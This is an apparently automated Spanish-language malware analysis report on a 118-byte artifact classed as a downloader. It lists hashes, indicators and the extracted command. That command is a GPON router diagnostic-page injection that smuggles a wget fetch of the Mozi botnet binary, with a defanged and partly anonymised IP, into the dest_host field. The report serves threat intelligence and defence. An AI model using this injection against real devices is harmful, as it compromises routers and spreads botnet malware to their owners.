# 🧬 Payload Analysis

`56de6cd616da9756ae909894a5285450ceae9df9e8d876a81ac00bef96dae8f3`

## 📌 Resumen

Artefacto identificado como ASCII text, with no line terminators de 118 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `Mozi.m+-O+-` en `hxxp://202.70.139.XXX:38564/Mozi.m+-O+-`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T21:04:07.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `56de6cd616da9756ae909894a5285450ceae9df9e8d876a81ac00bef96dae8f3`
- **SHA1:** `1a79092401ebd9b1dd353929efa29bf18f1ac4e1`
- **MD5:** `68170941ac0972772943b21ebec8baa7`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 118 B |
| Entropía | 5.17 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://202.70.139.XXX:38564/Mozi.m+-O+->/tmp/gpon80
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://202.70.139.XXX:38564/Mozi.m+-O+- | strings |
| ip | 202.70.139.XXX | static_analysis |
| command | XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://202.70.139.XXX:38564/Mozi.m+-O+->/tmp/gpon80 | strings |
| hash | 56de6cd616da9756ae909894a5285450ceae9df9e8d876a81ac00bef96dae8f3 | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
